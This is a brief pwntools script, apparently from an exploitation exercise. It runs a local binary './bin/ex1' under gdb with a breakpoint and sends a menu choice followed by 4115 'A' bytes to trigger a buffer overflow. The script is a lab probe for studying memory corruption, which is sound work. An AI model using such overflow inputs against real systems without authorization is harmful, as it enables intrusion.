from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "split-window", "-h"]

io = gdb.debug(
    "./bin/ex1",
    """
    b ex1.c:43
    continue
    """,
)

io.sendline(b"1")
io.sendline(b"A"*4115)
io.interactive()

